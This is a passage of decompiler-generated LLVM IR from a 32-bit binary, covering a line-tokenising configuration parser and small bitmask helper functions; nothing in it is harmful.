  %v2_80509c757 = phi i8 [ %v2_80509c750, %dec_label_pc_80509d1.lr.ph ], [ %v2_80509c7, %dec_label_pc_80509c6 ]
  %v1_80509c756 = phi i8* [ %v1_80509c749, %dec_label_pc_80509d1.lr.ph ], [ %v1_80509c7, %dec_label_pc_80509c6 ]
  %v0_80509c655 = phi i32 [ %v0_80509c7.pre, %dec_label_pc_80509d1.lr.ph ], [ %v1_80509c6, %dec_label_pc_80509c6 ]
  %v2_80509d1 = sext i8 %v2_80509c757 to i32
  store i32 %v2_80509d1, i32* @edx, align 4
  store i32 %v0_80509d4.pre, i32* @eax, align 4
  %v2_80509d9 = mul nsw i32 %v2_80509d1, 2
  %v3_80509d9 = add i32 %v0_80509d4.pre, %v2_80509d9
  %v4_80509d9 = inttoptr i32 %v3_80509d9 to i8*
  %v5_80509d9 = load i8, i8* %v4_80509d9, align 1
  %v6_80509d9 = and i8 %v5_80509d9, 32
  %v7_80509d9 = icmp eq i8 %v6_80509d9, 0
  %v1_80509dd = icmp eq i1 %v7_80509d9, false
  br i1 %v1_80509dd, label %dec_label_pc_80509c6, label %dec_label_pc_80509df

dec_label_pc_80509df:                             ; preds = %dec_label_pc_80509d1
  %v10_80509df = icmp eq i8 %v2_80509c757, 10
  br i1 %v10_80509df, label %dec_label_pc_8050b3a.backedge, label %dec_label_pc_80509e8

dec_label_pc_8050b3a.backedge:                    ; preds = %dec_label_pc_80509c7.preheader, %dec_label_pc_80509c6, %dec_label_pc_8050b00, %dec_label_pc_8050b2f, %dec_label_pc_8050b07, %dec_label_pc_80509df, %dec_label_pc_80509e8, %dec_label_pc_8050ab9
  %v0_8050b3a = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8050b41, i32* @ebx, align 4
  %v3_8050b46 = call i32 @function_804c93c(i32 %v2_8050b41, i32 128, i32 %v0_8050b3a)
  store i32 %v3_8050b46, i32* @eax, align 4
  %v1_8050b4e = icmp eq i32 %v3_8050b46, 0
  %v1_8050b50 = icmp eq i1 %v1_8050b4e, false
  br i1 %v1_8050b50, label %dec_label_pc_80509c7.preheader, label %dec_label_pc_8050b56

dec_label_pc_80509e8:                             ; preds = %dec_label_pc_80509df
  %v10_80509f0 = icmp eq i8 %v2_80509c757, 35
  %v1_80509f3 = icmp eq i1 %v10_80509f0, false
  br i1 %v1_80509f3, label %dec_label_pc_8050a44.preheader, label %dec_label_pc_8050b3a.backedge

dec_label_pc_8050a44.preheader:                   ; preds = %dec_label_pc_80509e8
  %v2_8050a444 = load i8, i8* %v1_80509c756, align 1
  %v3_8050a445 = icmp eq i8 %v2_8050a444, 0
  br i1 %v3_8050a445, label %dec_label_pc_8050a50, label %dec_label_pc_8050a49

dec_label_pc_80509fa:                             ; preds = %dec_label_pc_8050a49
  store i32 %stack_var_-196.011, i32* @eax, align 4
  %v1_80509fe = load i32, i32* @esp, align 4
  %v3_80509fe = mul nuw nsw i32 %stack_var_-196.011, 4
  %v4_80509fe = add nuw nsw i32 %v3_80509fe, 152
  %v5_80509fe = add i32 %v4_80509fe, %v1_80509fe
  %v6_80509fe = inttoptr i32 %v5_80509fe to i32*
  store i32 %v0_80509fe, i32* %v6_80509fe, align 4
  %v0_8050a08.pre = load i32, i32* @ebx, align 4
  %v4_8050a08.pre = load i32, i32* @ecx, align 4
  %v1_8050a0859 = inttoptr i32 %v0_8050a08.pre to i8*
  %v2_8050a0860 = load i8, i8* %v1_8050a0859, align 1
  %v3_8050a0861 = zext i8 %v2_8050a0860 to i32
  %v5_8050a0862 = and i32 %v4_8050a08.pre, -256
  %v6_8050a0863 = or i32 %v3_8050a0861, %v5_8050a0862
  %v4_8050a0a64 = icmp eq i8 %v2_8050a0860, 0
  br i1 %v4_8050a0a64, label %dec_label_pc_8050a27.preheader, label %dec_label_pc_8050a0e.lr.ph

dec_label_pc_8050a0e.lr.ph:                       ; preds = %dec_label_pc_80509fa
  %v0_8050a11.pre = load i32, i32* @global_var_80559e0, align 32
  br label %dec_label_pc_8050a0e

dec_label_pc_8050a07:                             ; preds = %dec_label_pc_8050a1c
  %v1_8050a07 = add i32 %v0_8050a0765, 1
  store i32 %v1_8050a07, i32* @ebx, align 4
  %v1_8050a08 = inttoptr i32 %v1_8050a07 to i8*
  %v2_8050a08 = load i8, i8* %v1_8050a08, align 1
  %v3_8050a08 = zext i8 %v2_8050a08 to i32
  %v5_8050a08 = and i32 %v6_8050a0867, -256
  %v6_8050a08 = or i32 %v3_8050a08, %v5_8050a08
  %v4_8050a0a = icmp eq i8 %v2_8050a08, 0
  br i1 %v4_8050a0a, label %dec_label_pc_8050a27.preheader, label %dec_label_pc_8050a0e

dec_label_pc_8050a0e:                             ; preds = %dec_label_pc_8050a0e.lr.ph, %dec_label_pc_8050a07
  %v6_8050a0867 = phi i32 [ %v6_8050a0863, %dec_label_pc_8050a0e.lr.ph ], [ %v6_8050a08, %dec_label_pc_8050a07 ]
  %v2_8050a0866 = phi i8 [ %v2_8050a0860, %dec_label_pc_8050a0e.lr.ph ], [ %v2_8050a08, %dec_label_pc_8050a07 ]
  %v0_8050a0765 = phi i32 [ %v0_8050a08.pre, %dec_label_pc_8050a0e.lr.ph ], [ %v1_8050a07, %dec_label_pc_8050a07 ]
  %v2_8050a0e = sext i8 %v2_8050a0866 to i32
  store i32 %v2_8050a0e, i32* @edx, align 4
  store i32 %v0_8050a11.pre, i32* @eax, align 4
  %v2_8050a16 = mul nsw i32 %v2_8050a0e, 2
  %v3_8050a16 = add i32 %v0_8050a11.pre, %v2_8050a16
  %v4_8050a16 = inttoptr i32 %v3_8050a16 to i8*
  %v5_8050a16 = load i8, i8* %v4_8050a16, align 1
  %v6_8050a16 = and i8 %v5_8050a16, 32
  %v7_8050a16 = icmp eq i8 %v6_8050a16, 0
  %v1_8050a1a = icmp eq i1 %v7_8050a16, false
  br i1 %v1_8050a1a, label %dec_label_pc_8050a27.preheader, label %dec_label_pc_8050a1c

dec_label_pc_8050a1c:                             ; preds = %dec_label_pc_8050a0e
  %v10_8050a1c = icmp eq i8 %v2_8050a0866, 10
  %v1_8050a1f = icmp eq i1 %v10_8050a1c, false
  br i1 %v1_8050a1f, label %dec_label_pc_8050a07, label %dec_label_pc_8050a27.preheader

dec_label_pc_8050a27.preheader:                   ; preds = %dec_label_pc_8050a1c, %dec_label_pc_8050a0e, %dec_label_pc_8050a07, %dec_label_pc_80509fa
  %v0_8050a07.lcssa = phi i32 [ %v0_8050a08.pre, %dec_label_pc_80509fa ], [ %v1_8050a07, %dec_label_pc_8050a07 ], [ %v0_8050a0765, %dec_label_pc_8050a0e ], [ %v0_8050a0765, %dec_label_pc_8050a1c ]
  %v6_8050a08.lcssa = phi i32 [ %v6_8050a0863, %dec_label_pc_80509fa ], [ %v6_8050a08, %dec_label_pc_8050a07 ], [ %v6_8050a0867, %dec_label_pc_8050a0e ], [ %v6_8050a0867, %dec_label_pc_8050a1c ]
  %v1_8050a2773 = inttoptr i32 %v0_8050a07.lcssa to i8*
  %v2_8050a2774 = load i8, i8* %v1_8050a2773, align 1
  %v3_8050a2775 = zext i8 %v2_8050a2774 to i32
  %v5_8050a2776 = and i32 %v6_8050a08.lcssa, -256
  %v6_8050a2777 = or i32 %v3_8050a2775, %v5_8050a2776
  store i32 %v6_8050a2777, i32* @ecx, align 4
  %v4_8050a2978 = icmp eq i8 %v2_8050a2774, 0
  br i1 %v4_8050a2978, label %dec_label_pc_8050a40, label %dec_label_pc_8050a2d

dec_label_pc_8050a23:                             ; preds = %dec_label_pc_8050a3b, %dec_label_pc_8050a2d
  store i8 0, i8* %v1_8050a2780, align 1
  %v0_8050a26 = load i32, i32* @ebx, align 4
  %v1_8050a26 = add i32 %v0_8050a26, 1
  store i32 %v1_8050a26, i32* @ebx, align 4
  %v4_8050a27.pre = load i32, i32* @ecx, align 4
  %v1_8050a27 = inttoptr i32 %v1_8050a26 to i8*
  %v2_8050a27 = load i8, i8* %v1_8050a27, align 1
  %v3_8050a27 = zext i8 %v2_8050a27 to i32
  %v5_8050a27 = and i32 %v4_8050a27.pre, -256
  %v6_8050a27 = or i32 %v3_8050a27, %v5_8050a27
  store i32 %v6_8050a27, i32* @ecx, align 4
  %v4_8050a29 = icmp eq i8 %v2_8050a27, 0
  br i1 %v4_8050a29, label %dec_label_pc_8050a40, label %dec_label_pc_8050a2d

dec_label_pc_8050a2d:                             ; preds = %dec_label_pc_8050a27.preheader, %dec_label_pc_8050a23
  %v2_8050a2781 = phi i8 [ %v2_8050a27, %dec_label_pc_8050a23 ], [ %v2_8050a2774, %dec_label_pc_8050a27.preheader ]
  %v1_8050a2780 = phi i8* [ %v1_8050a27, %dec_label_pc_8050a23 ], [ %v1_8050a2773, %dec_label_pc_8050a27.preheader ]
  %v0_8050a4479 = phi i32 [ %v1_8050a26, %dec_label_pc_8050a23 ], [ %v0_8050a07.lcssa, %dec_label_pc_8050a27.preheader ]
  %v2_8050a2d = sext i8 %v2_8050a2781 to i32
  store i32 %v2_8050a2d, i32* @edx, align 4
  %v0_8050a30 = load i32, i32* @global_var_80559e0, align 32
  store i32 %v0_8050a30, i32* @eax, align 4
  %v2_8050a35 = mul nsw i32 %v2_8050a2d, 2
  %v3_8050a35 = add i32 %v0_8050a30, %v2_8050a35
  %v4_8050a35 = inttoptr i32 %v3_8050a35 to i8*
  %v5_8050a35 = load i8, i8* %v4_8050a35, align 1
  %v6_8050a35 = and i8 %v5_8050a35, 32
  %v7_8050a35 = icmp eq i8 %v6_8050a35, 0
  %v1_8050a39 = icmp eq i1 %v7_8050a35, false
  br i1 %v1_8050a39, label %dec_label_pc_8050a23, label %dec_label_pc_8050a3b

dec_label_pc_8050a3b:                             ; preds = %dec_label_pc_8050a2d
  %v10_8050a3b = icmp eq i8 %v2_8050a2781, 10
  br i1 %v10_8050a3b, label %dec_label_pc_8050a23, label %dec_label_pc_8050a40

dec_label_pc_8050a40:                             ; preds = %dec_label_pc_8050a23, %dec_label_pc_8050a3b, %dec_label_pc_8050a27.preheader
  %v0_8050a44.lcssa = phi i32 [ %v0_8050a07.lcssa, %dec_label_pc_8050a27.preheader ], [ %v0_8050a4479, %dec_label_pc_8050a3b ], [ %v1_8050a26, %dec_label_pc_8050a23 ]
  %v1_8050a27.lcssa = phi i8* [ %v1_8050a2773, %dec_label_pc_8050a27.preheader ], [ %v1_8050a2780, %dec_label_pc_8050a3b ], [ %v1_8050a27, %dec_label_pc_8050a23 ]
  %v4_8050a40 = add nuw nsw i32 %stack_var_-196.011, 1
  %v2_8050a44 = load i8, i8* %v1_8050a27.lcssa, align 1
  %v3_8050a44 = icmp eq i8 %v2_8050a44, 0
  br i1 %v3_8050a44, label %dec_label_pc_8050a50, label %dec_label_pc_8050a49

dec_label_pc_8050a49:                             ; preds = %dec_label_pc_8050a44.preheader, %dec_label_pc_8050a40
  %v0_80509fe = phi i32 [ %v0_8050a44.lcssa, %dec_label_pc_8050a40 ], [ %v0_80509c655, %dec_label_pc_8050a44.preheader ]
  %stack_var_-196.011 = phi i32 [ %v4_8050a40, %dec_label_pc_8050a40 ], [ 0, %dec_label_pc_8050a44.preheader ]
  %v7_8050a4e = icmp sgt i32 %stack_var_-196.011, 4
  br i1 %v7_8050a4e, label %dec_label_pc_8050a50, label %dec_label_pc_80509fa

dec_label_pc_8050a50:                             ; preds = %dec_label_pc_8050a40, %dec_label_pc_8050a49, %dec_label_pc_8050a44.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8050a44.preheader ], [ %v4_8050a40, %dec_label_pc_8050a40 ], [ %stack_var_-196.011, %dec_label_pc_8050a49 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8050a57 = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_80545e7.202 to i32), i32* %stack_var_-216, align 4
  %v5_8050a5f = call i32 @function_8050fb4(i8* %v4_8050a5f, i32 ptrtoint ([11 x i8]* @global_var_80545e7.202 to i32), i32 %v0_8050a57, i32 %v0_8050a57)
  store i32 %v5_8050a5f, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_8050a6c = icmp eq i32 %v5_8050a5f, 0
  br i1 %v1_8050a6c, label %dec_label_pc_8050a94.preheader, label %dec_label_pc_8050aa5

dec_label_pc_8050a94.preheader:                   ; preds = %dec_label_pc_8050a50
  %v5_8050a9888 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8050a9888, label %dec_label_pc_8050a9a.lr.ph, label %dec_label_pc_8050aa5

dec_label_pc_8050a9a.lr.ph:                       ; preds = %dec_label_pc_8050a94.preheader
  %v0_8050a9a.pre = load i32, i32* @global_var_80586d4.137, align 4
  br label %dec_label_pc_8050a9a

dec_label_pc_8050a72:                             ; preds = %dec_label_pc_8050a9a
  %v2_8050a75 = mul i32 %v1_8050a7589, 4
  %v4_8050a75 = add i32 %v2_8050a75, %v3_8050a75
  %v5_8050a75 = inttoptr i32 %v4_8050a75 to i32*
  %v6_8050a75 = load i32, i32* %v5_8050a75, align 4
  %v1_8050a7c = call i32 @function_804d014(i32 %v6_8050a75)
  %v0_8050a81 = load i32, i32* @esi, align 4
  %v1_8050a81 = add i32 %v0_8050a81, 1
  store i32 %v1_8050a81, i32* @esi, align 4
  %v1_8050a82 = load i32, i32* @ebx, align 4
  %v2_8050a82 = mul i32 %v1_8050a82, 4
  %v3_8050a82 = add i32 %v2_8050a82, 134579912
  %v4_8050a82 = inttoptr i32 %v3_8050a82 to i32*
  store i32 %v1_8050a7c, i32* %v4_8050a82, align 4
  %v0_8050a89 = load i32, i32* @ebx, align 4
  %v1_8050a89 = add i32 %v0_8050a89, 1
  store i32 %v1_8050a89, i32* @eax, align 4
  store i32 %v1_8050a89, i32* @global_var_80586d4.137, align 4
  %v0_8050a94.pre = load i32, i32* @esi, align 4
  %v5_8050a98 = icmp slt i32 %v0_8050a94.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8050a98, label %dec_label_pc_8050a9a, label %dec_label_pc_8050aa5

dec_label_pc_8050a9a:                             ; preds = %dec_label_pc_8050a9a.lr.ph, %dec_label_pc_8050a72
  %v0_8050a9a = phi i32 [ %v0_8050a9a.pre, %dec_label_pc_8050a9a.lr.ph ], [ %v1_8050a89, %dec_label_pc_8050a72 ]
  %v1_8050a7589 = phi i32 [ 1, %dec_label_pc_8050a9a.lr.ph ], [ %v0_8050a94.pre, %dec_label_pc_8050a72 ]
  store i32 %v0_8050a9a, i32* @ebx, align 4
  %v7_8050aa3 = icmp sgt i32 %v0_8050a9a, 2
  br i1 %v7_8050aa3, label %dec_label_pc_8050aa5, label %dec_label_pc_8050a72

dec_label_pc_8050aa5:                             ; preds = %dec_label_pc_8050a94.preheader, %dec_label_pc_8050a72, %dec_label_pc_8050a9a, %dec_label_pc_8050a50
  %v0_8050aa5 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80545f2.203 to i32), i32* %stack_var_-216, align 4
  %v0_8050aac = load i32, i32* @edi, align 4
  %v4_8050aad = inttoptr i32 %v0_8050aac to i8*
  %v5_8050aad = call i32 @function_8050fb4(i8* %v4_8050aad, i32 ptrtoint ([7 x i8]* @global_var_80545f2.203 to i32), i32 %v0_8050aa5, i32 %v0_8050aa5)
  store i32 %v5_8050aad, i32* @eax, align 4
  %v1_8050ab5 = icmp eq i32 %v5_8050aad, 0
  br i1 %v1_8050ab5, label %dec_label_pc_8050af7.preheader, label %dec_label_pc_8050ab9

dec_label_pc_8050ab9:                             ; preds = %dec_label_pc_8050aa5
  %v0_8050ab9 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80545f9.204 to i32), i32* %stack_var_-216, align 4
  %v0_8050ac0 = load i32, i32* @edi, align 4
  %v4_8050ac1 = inttoptr i32 %v0_8050ac0 to i8*
  %v5_8050ac1 = call i32 @function_8050fb4(i8* %v4_8050ac1, i32 ptrtoint ([7 x i8]* @global_var_80545f9.204 to i32), i32 %v0_8050ab9, i32 %v0_8050ab9)
  %v1_8050ac9 = icmp eq i32 %v5_8050ac1, 0
  br i1 %v1_8050ac9, label %dec_label_pc_8050af7.preheader, label %dec_label_pc_8050b3a.backedge

dec_label_pc_8050af7.preheader:                   ; preds = %dec_label_pc_8050aa5, %dec_label_pc_8050ab9
  %v0_8050af790 = load i32, i32* @global_var_80586d8.197, align 8
  %tmp4392 = icmp slt i32 %v0_8050af790, 1
  %tmp4493 = icmp eq i1 %tmp4392, false
  br i1 %tmp4493, label %dec_label_pc_8050acf, label %dec_label_pc_8050b00

dec_label_pc_8050acf:                             ; preds = %dec_label_pc_8050af7.preheader, %dec_label_pc_8050acf.dec_label_pc_8050acf_crit_edge
  %v0_8050af794 = phi i32 [ %v0_8050af7, %dec_label_pc_8050acf.dec_label_pc_8050acf_crit_edge ], [ %v0_8050af790, %dec_label_pc_8050af7.preheader ]
  %v1_8050acf = add i32 %v0_8050af794, -1
  store i32 %v1_8050acf, i32* @global_var_80586d8.197, align 8
  %v1_8050ad8 = mul i32 %v1_8050acf, 4
  %v2_8050ad8 = add i32 %v1_8050ad8, 134579896
  %v3_8050ad8 = inttoptr i32 %v2_8050ad8 to i32*
  %v4_8050ad8 = load i32, i32* %v3_8050ad8, align 4
  %v1_8050adf = call i32 @function_804e0e5(i32 %v4_8050ad8)
  %v0_8050ae4 = load i32, i32* @global_var_80586d8.197, align 8
  %v1_8050aec = mul i32 %v0_8050ae4, 4
  %v2_8050aec = add i32 %v1_8050aec, ptrtoint (i32* @global_var_80586b8.205 to i32)
  %v3_8050aec = inttoptr i32 %v2_8050aec to i32*
  store i32 0, i32* %v3_8050aec, align 4
  %v0_8050af7 = load i32, i32* @global_var_80586d8.197, align 8
  %tmp43 = icmp slt i32 %v0_8050af7, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_8050acf.dec_label_pc_8050acf_crit_edge, label %dec_label_pc_8050b00

dec_label_pc_8050acf.dec_label_pc_8050acf_crit_edge: ; preds = %dec_label_pc_8050acf
  br label %dec_label_pc_8050acf

dec_label_pc_8050b00:                             ; preds = %dec_label_pc_8050acf, %dec_label_pc_8050af7.preheader
  %v0_8050af7.lcssa = phi i32 [ %v0_8050af790, %dec_label_pc_8050af7.preheader ], [ %v0_8050af7, %dec_label_pc_8050acf ]
  store i32 1, i32* @esi, align 4
  %v5_8050b2d98 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8050b2d98, label %dec_label_pc_8050b2f, label %dec_label_pc_8050b3a.backedge

dec_label_pc_8050b07:                             ; preds = %dec_label_pc_8050b2f
  %v2_8050b0a = mul i32 %v1_8050b0a100, 4
  %v4_8050b0a = add i32 %v2_8050b0a, %v3_8050a75
  %v5_8050b0a = inttoptr i32 %v4_8050b0a to i32*
  %v6_8050b0a = load i32, i32* %v5_8050b0a, align 4
  %v1_8050b11 = call i32 @function_804d014(i32 %v6_8050b0a)
  %v0_8050b16 = load i32, i32* @esi, align 4
  %v1_8050b16 = add i32 %v0_8050b16, 1
  store i32 %v1_8050b16, i32* @esi, align 4
  %v1_8050b17 = load i32, i32* @ebx, align 4
  %v2_8050b17 = mul i32 %v1_8050b17, 4
  %v3_8050b17 = add i32 %v2_8050b17, 134579896
  %v4_8050b17 = inttoptr i32 %v3_8050b17 to i32*
  store i32 %v1_8050b11, i32* %v4_8050b17, align 4
  %v0_8050b1e = load i32, i32* @ebx, align 4
  %v1_8050b1e = add i32 %v0_8050b1e, 1
  store i32 %v1_8050b1e, i32* @global_var_80586d8.197, align 8
  %v0_8050b29.pre = load i32, i32* @esi, align 4
  %v5_8050b2d = icmp slt i32 %v0_8050b29.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8050b2d, label %dec_label_pc_8050b2f, label %dec_label_pc_8050b3a.backedge

dec_label_pc_8050b2f:                             ; preds = %dec_label_pc_8050b00, %dec_label_pc_8050b07
  %v1_8050b0a100 = phi i32 [ %v0_8050b29.pre, %dec_label_pc_8050b07 ], [ 1, %dec_label_pc_8050b00 ]
  %v0_8050b2f99 = phi i32 [ %v1_8050b1e, %dec_label_pc_8050b07 ], [ %v0_8050af7.lcssa, %dec_label_pc_8050b00 ]
  store i32 %v0_8050b2f99, i32* @ebx, align 4
  %v7_8050b38 = icmp sgt i32 %v0_8050b2f99, 3
  br i1 %v7_8050b38, label %dec_label_pc_8050b3a.backedge, label %dec_label_pc_8050b07

dec_label_pc_80509c7.preheader:                   ; preds = %dec_label_pc_80509c7.preheader.lr.ph, %dec_label_pc_8050b3a.backedge
  %v0_80509c7.pre = load i32, i32* @ebx, align 4
  %v4_80509c7.pre = load i32, i32* @ecx, align 4
  %v1_80509c749 = inttoptr i32 %v0_80509c7.pre to i8*
  %v2_80509c750 = load i8, i8* %v1_80509c749, align 1
  %v3_80509c751 = zext i8 %v2_80509c750 to i32
  %v5_80509c752 = and i32 %v4_80509c7.pre, -256
  %v6_80509c753 = or i32 %v3_80509c751, %v5_80509c752
  store i32 %v6_80509c753, i32* @ecx, align 4
  %v4_80509c954 = icmp eq i8 %v2_80509c750, 0
  br i1 %v4_80509c954, label %dec_label_pc_8050b3a.backedge, label %dec_label_pc_80509d1.lr.ph

dec_label_pc_80509d1.lr.ph:                       ; preds = %dec_label_pc_80509c7.preheader
  %v0_80509d4.pre = load i32, i32* @global_var_80559e0, align 32
  br label %dec_label_pc_80509d1

dec_label_pc_8050b56:                             ; preds = %dec_label_pc_8050b3a.backedge, %dec_label_pc_8050b3a.preheader
  %v0_8050b59 = load i32, i32* @ebp, align 4
  %v1_8050b5a = inttoptr i32 %v0_8050b59 to i16*
  %v2_8050b5a = call i32 @function_804b4c4(i16* %v1_8050b5a)
  br label %dec_label_pc_8050b6f

dec_label_pc_8050b64:                             ; preds = %dec_label_pc_80509a3
  %v0_8050b64 = call i32 @function_804f478()
  %v1_8050b69 = inttoptr i32 %v0_8050b64 to i32*
  store i32 3, i32* %v1_8050b69, align 4
  br label %dec_label_pc_8050b6f

dec_label_pc_8050b6f:                             ; preds = %dec_label_pc_8050948, %dec_label_pc_8050b56, %dec_label_pc_8050b64
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_805095c, i32* @eax, align 4
  %v2_8050b7b = call i32 @function_804ec6e(i32 %v2_805095c, i32 1)
  store i32 %v0_8050948, i32* @ebp, align 4
  ret i32 %v2_8050b7b

; uselistorder directives
  uselistorder i32 %v0_80509d4.pre, { 1, 0 }
  uselistorder i32 %v6_80509c753, { 1, 0 }
  uselistorder i8 %v2_80509c750, { 1, 2, 0 }
  uselistorder i8* %v1_80509c749, { 1, 0 }
  uselistorder i32 %v0_80509c7.pre, { 1, 0 }
  uselistorder i32 %v0_8050af7, { 0, 2, 1 }
  uselistorder i32 %v1_8050acf, { 1, 0 }
  uselistorder i32 %v0_8050a9a, { 1, 0 }
  uselistorder i32 %v0_8050a94.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.011, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8050a2d, { 1, 0 }
  uselistorder i8 %v2_8050a2781, { 1, 0 }
  uselistorder i32 %v2_8050a0e, { 1, 0 }
  uselistorder i8 %v2_8050a0866, { 1, 0 }
  uselistorder i32 %v1_8050a07, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80509d1, { 1, 0 }
  uselistorder i32 %v1_80509c6, { 1, 0, 2 }
  uselistorder i32 %v2_8050b41, { 2, 3, 0, 1 }
  uselistorder i32 %v2_80509af, { 1, 0 }
  uselistorder i32 %v2_8050991, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @function_804f478, { 5, 4, 2, 1, 0, 3 }
  uselistorder i32 (i32)* @function_804e0e5, { 17, 16, 15, 4, 3, 2, 1, 0, 6, 14, 13, 12, 11, 10, 9, 8, 19, 18, 7, 21, 20, 5 }
  uselistorder i32* @global_var_80586d8.197, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_80586d4.137, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80559f0.136 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8050b6f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80509c7.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050b2f, { 1, 0 }
  uselistorder label %dec_label_pc_8050acf, { 1, 0 }
  uselistorder label %dec_label_pc_8050af7.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8050aa5, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8050a9a, { 1, 0 }
  uselistorder label %dec_label_pc_8050a50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050a49, { 1, 0 }
  uselistorder label %dec_label_pc_8050a40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050a2d, { 1, 0 }
  uselistorder label %dec_label_pc_8050a0e, { 1, 0 }
  uselistorder label %dec_label_pc_8050b3a.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_8050b3a.preheader, { 1, 0 }
}

define i32 @function_8050b8c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8050b8c:
  %v9_8050baf = inttoptr i32 %arg3 to i32*
  %v10_8050baf = call i32 @function_80518c5(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_8050baf, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_8050baf
}

define i32 @function_8050bb8() local_unnamed_addr {
dec_label_pc_8050bb8:
  %stack_var_-16 = alloca i32, align 4
  %v2_8050bdb = ptrtoint i32* %stack_var_-16 to i32
  %v2_8050be2 = call i32 @function_804efb8(i32 9, i32 %v2_8050bdb)
  ret i32 %v2_8050be2

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804efb8, { 6, 4, 8, 7, 3, 2, 5, 1, 0 }
}

define i32 @function_8050bec(i32 %arg1) local_unnamed_addr {
dec_label_pc_8050bec:
  %v0_8050bef = call i32 @function_804b314()
  %v2_8050bfb = call i32 @function_804b3a4(i32 %v0_8050bef, i32 %arg1)
  ret i32 %v2_8050bfb
}

define i32 @function_8050c04(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050c04:
  %v1_8050c12 = add i32 %arg2, -1
  %v1_8050c15 = urem i32 %v1_8050c12, 32
  %v2_8050c15 = icmp eq i32 %v1_8050c15, 0
  %v2_8050c18 = udiv i32 %v1_8050c12, 32
  br i1 %v2_8050c15, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8050c04
  %v5_8050c1b = shl i32 1, %v1_8050c15
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8050c04, %bb
  %v6_8050c1d = phi i32 [ 1, %dec_label_pc_8050c04 ], [ %v5_8050c1b, %bb ]
  %v2_8050c1d = mul nuw nsw i32 %v2_8050c18, 4
  %v3_8050c1d = add i32 %v2_8050c1d, %arg1
  %v4_8050c1d = inttoptr i32 %v3_8050c1d to i32*
  %v5_8050c1d = load i32, i32* %v4_8050c1d, align 4
  %v7_8050c1d = and i32 %v5_8050c1d, %v6_8050c1d
  %v8_8050c1d = icmp eq i32 %v7_8050c1d, 0
  %v1_8050c21 = icmp eq i1 %v8_8050c1d, false
  %v2_8050c21 = zext i1 %v1_8050c21 to i32
  ret i32 %v2_8050c21

; uselistorder directives
  uselistorder i32 %v1_8050c15, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @function_8050c28(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050c28:
  %stack_var_-4 = alloca i32, align 4
  %v0_8050c28 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c28, i32* %stack_var_-4, align 4
  %v1_8050c36 = add i32 %arg2, -1
  %v1_8050c39 = urem i32 %v1_8050c36, 32
  %v2_8050c39 = icmp eq i32 %v1_8050c39, 0
  store i32 %v1_8050c39, i32* @ecx, align 4
  %v2_8050c3c = udiv i32 %v1_8050c36, 32
  store i32 %v2_8050c3c, i32* @edx, align 4
  br i1 %v2_8050c39, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_8050c28
  %v5_8050c3f = shl i32 1, %v1_8050c39
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_8050c28, %bb
  %v6_8050c41 = phi i32 [ 1, %dec_label_pc_8050c28 ], [ %v5_8050c3f, %bb ]
  %v2_8050c41 = mul nuw nsw i32 %v2_8050c3c, 4
  %v3_8050c41 = add i32 %v2_8050c41, %arg1
  %v4_8050c41 = inttoptr i32 %v3_8050c41 to i32*
  %v5_8050c41 = load i32, i32* %v4_8050c41, align 4
  %v7_8050c41 = or i32 %v5_8050c41, %v6_8050c41
  store i32 %v7_8050c41, i32* %v4_8050c41, align 4
  %v2_8050c46 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050c46, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_8050c3c, { 1, 0 }
  uselistorder i32 %v1_8050c39, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

